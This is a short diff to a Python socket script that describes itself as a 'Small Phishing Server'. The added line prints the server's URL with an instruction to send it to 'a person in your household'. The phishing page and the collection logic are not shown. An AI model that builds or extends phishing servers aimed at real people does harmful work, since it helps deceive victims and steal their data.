@@ -6,6 +6,7 @@ s.bind((ip, port))
 print(f'[+] Hostname: {socket.gethostname()}')
 print(f"[+] Server hosted on {ip}:{port}")
 print("[+] Small Phishing Server is Up.....")
+print(f"\n[+] Send this to a person in your household: http://{ip}")
 def listen():
     while True:
         try:
